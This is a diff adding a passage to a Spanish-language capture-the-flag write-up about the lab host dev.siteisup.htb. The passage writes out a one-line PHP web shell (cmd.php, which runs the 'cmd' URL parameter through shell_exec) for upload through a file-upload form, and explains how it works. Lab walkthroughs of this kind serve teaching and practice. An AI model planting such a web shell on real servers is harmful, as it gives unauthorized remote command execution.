@@ -93,4 +93,18 @@ Ahora al interceptar una petición se nos añadiría automáticamente la cabecer
 
 Si dejamos que la petición continúe su trafico después de ser interceptada y modificada vemos que la web `dev.siteisup.htb` ha variado su contenido teniendo ahora aun botón al *Amdin Panel* y una opción de subida de ficheros para validar si una lista de webs están levantadas.
 
-Como temeos un campo de subida de archivo vamos 
+Como temeos un campo de subida de archivo vamos a probar a crearnos un archivo llamado `cmd.php` para subirlo y ver como interacciona la web con el.
+En el script vamos a crear un script que nos permita ejecutar comandos
+```php
+<?php
+ echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
+?>
+```
+
+El script lo que hace es lo siguiente:
+- Utiliza etiquetas preformateadas para mantener el formato del texto intacto por parte del navegador
+- Con *shell_exec* ejecuta el texto como comando de sistema devolviendo su salida
+- Y el parámetro *$_GET* lee el parametro *cmd* directamente desde la URL
+
+Habiendo así construido una webshell con php
+Ahora lo subiremos al servidor y obtendremos como respuesta que la extensión no es permitida
